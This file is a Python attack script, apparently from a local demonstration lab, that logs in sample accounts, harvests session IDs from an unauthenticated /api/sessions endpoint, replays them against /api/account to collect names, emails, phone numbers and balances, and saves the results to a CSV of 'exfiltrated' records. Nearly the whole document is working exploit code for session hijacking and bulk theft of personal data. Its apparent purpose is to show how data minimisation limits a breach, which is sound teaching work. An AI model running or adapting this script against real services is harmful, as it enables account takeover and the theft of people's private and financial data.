
# Attack chain:
# 1. Simulate users  — login multiple accounts via /api/login
# 2. Session Scan    — call /api/sessions without authentication
# 3. Exfiltration    — call /api/account with stolen session_ids
# 4. Export          — save collected personal data to CSV

import os
import csv
import json
import random
import requests
from pathlib import Path

BASE        = os.environ.get("TARGET", "http://localhost:5000")
DB_PATH     = Path(__file__).parent.parent / "data" / "users.json"
OUTPUT_PATH = Path(__file__).parent.parent / "data" / "exfiltrated_data.csv"
LOGIN_COUNT = 10  # number of accounts to simulate as logged in

def section(title):
    print()
    print("=" * 55)
    print(f"  {title}")
    print("=" * 55)


# STEP 0: Simulate logged-in users
section("STEP 0 — Simulate active users (login via /api/login)")

if not DB_PATH.exists():
    print("  users.json not found — run run.py first.")
    exit(1)

with open(DB_PATH) as f:
    all_users = json.load(f)

sample   = random.sample(all_users, min(LOGIN_COUNT, len(all_users)))
logged_in = 0

for user in sample:
    resp = requests.post(f"{BASE}/api/login", json={
        "username":  user["username"],
        "password":  user["password"],
        "device_id": "BROWSER-HOME-001",
        "location":  user.get("personal_data", {}).get("location", "London, UK"),
    })
    data = resp.json()
    if data.get("ok") and "session_id" in data:
        logged_in += 1
        print(f"  ✓ {user['username']:30}  logged in")
    else:
        print(f"  ✗ {user['username']:30}  login failed")

print(f"\n  {logged_in} / {len(sample)} accounts now active")

if logged_in == 0:
    print("  No active sessions created — aborting.")
    exit(1)

# STEP 1: Session Scan 
section("STEP 1 — Session scan (/api/sessions)")

resp = requests.get(f"{BASE}/api/sessions")
if not resp.text.strip():
    print(f"  /api/sessions failed — empty response (status={resp.status_code})")
    exit(1)
try:
    data = resp.json()
except Exception:
    print(f"  /api/sessions failed — invalid response: {resp.text[:100]}")
    exit(1)

if not data.get("ok"):
    print(f"  /api/sessions failed — {data.get('error', 'unknown error')}")
    exit(1)

sessions = data.get("sessions", [])
print(f"  /api/sessions called — no authentication required")
print(f"  Active sessions found: {len(sessions)}\n")

if not sessions:
    print("  No active sessions found.")
    exit(1)

print(f"  {'username':<30}  {'account_id':<15}  {'location'}")
print(f"  {'─'*30}  {'─'*15}  {'─'*20}")
for s in sessions:
    print(f"  {s['user_id']:<30}  {s['account_id']:<15}  {s['location']}")

# STEP 2: Exfiltrate via /api/account 
section("STEP 2 — Data exfiltration (/api/account calls)")

exfiltrated = []
minimised_count = 0
print(f"  {'username':<30}  {'name':<20}  {'email':<30}  balance")
print(f"  {'─'*30}  {'─'*20}  {'─'*30}  {'─'*10}")

for sess in sessions:
    resp = requests.post(f"{BASE}/api/account", json={
        "session_id": sess["session_id"],
    })
    result = resp.json()

    if result.get("ok"):
        acc = result["account"]
        if acc.get("data_minimised"):
            minimised_count += 1
        pd  = acc.get("personal_data", {})
        record = {
            "username":   sess["user_id"],
            "account_id": acc.get("account_id", ""),
            "balance":    acc.get("balance", 0),
            "name":       pd.get("name", ""),
            "email":      pd.get("email", ""),
            "phone":      pd.get("phone", ""),
            "location":   pd.get("location", ""),
        }
        exfiltrated.append(record)
        print(f"  ✓ {record['username']:<30}  "
              f"{record['name']:<20}  "
              f"{record['email']:<30}  "
              f"£{record['balance']:.2f}")
    else:
        print(f"  ✗ {sess['user_id']:<30}  failed")

print(f"\n  Records collected: {len(exfiltrated)}")

# STEP 3: Export collected data 
section("STEP 3 — Export exfiltrated data")

OUTPUT_PATH.parent.mkdir(exist_ok=True)
with open(OUTPUT_PATH, "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=[
        "username", "account_id", "balance",
        "name", "email", "phone", "location"
    ])
    writer.writeheader()
    writer.writerows(exfiltrated)

print(f"  Saved to: {OUTPUT_PATH}")

# SUMMARY 
section("ATTACK COMPLETE — Summary")
print()
print(f"  Users simulated       : {logged_in}")
print(f"  Sessions scanned      : {len(sessions)}")
print(f"  Records exfiltrated   : {len(exfiltrated)}")
print()
if minimised_count == 0:
    print("No data minimisation")
else:
    print(" Data minimisation reduced the value of exfiltrated records")
print()
print(f"  Audit log : {BASE}/audit")
print()